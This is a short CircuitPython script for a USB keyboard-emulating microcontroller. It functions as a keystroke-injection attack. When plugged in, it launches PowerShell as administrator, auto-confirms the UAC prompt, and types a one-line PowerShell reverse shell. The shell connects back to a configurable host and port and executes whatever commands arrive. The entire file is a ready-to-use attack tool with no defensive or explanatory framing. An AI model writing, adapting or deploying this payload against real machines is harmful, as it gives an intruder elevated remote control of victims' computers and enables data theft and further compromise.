import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

lhost = '127.0.0.1' #CHANGE ME
lport = 4444 #CHANGE ME 

def revshell(host, port):
    kbd.send(Keycode.GUI)
    time.sleep(0.5)

    layout.write("powershell")
    time.sleep(0.5)

    kbd.press(Keycode.CONTROL, Keycode.SHIFT, Keycode.ENTER)
    kbd.release_all()
    
    # 4. Wait for UAC prompt to appear
    time.sleep(1.5)

    kbd.press(Keycode.ALT, Keycode.Y)
    time.sleep(0.1)

    kbd.release_all()
                                                                                                                                                 
    time.sleep(1)
    layout.write(f'$c=New-Object Net.Sockets.TCPClient(\'{host}\',{port})')
    layout.write(';if($c.Connected){$s=$c.GetStream();$r=New-Object IO.StreamReader($s);$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;while(!$r.EndOfStream){$l=$r.ReadLine();if($l){$o=(iex $l 2>&1|Out-String);$w.WriteLine($o)}};$c.Close()}')
    kbd.press(Keycode.ENTER)
    kbd.release_all()


time.sleep(2) 
revshell(lhost, lport)